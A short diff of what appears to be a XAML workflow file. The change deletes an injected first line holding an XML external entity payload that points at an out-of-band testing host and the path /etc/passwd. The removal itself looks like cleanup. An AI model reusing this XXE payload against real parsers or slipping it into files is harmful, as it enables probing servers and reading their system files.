@@ -1,4 +1,3 @@
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://fowgzaapgpeicmfzsduupzaddtiko9ozu.oast.fun/etc/passwd'>]><root>&test;</root>
 <Activity mc:Ignorable="sap sap2010" x:Class="Main"
  xmlns="http://schemas.microsoft.com/netfx/2009/xaml/activities"
  xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
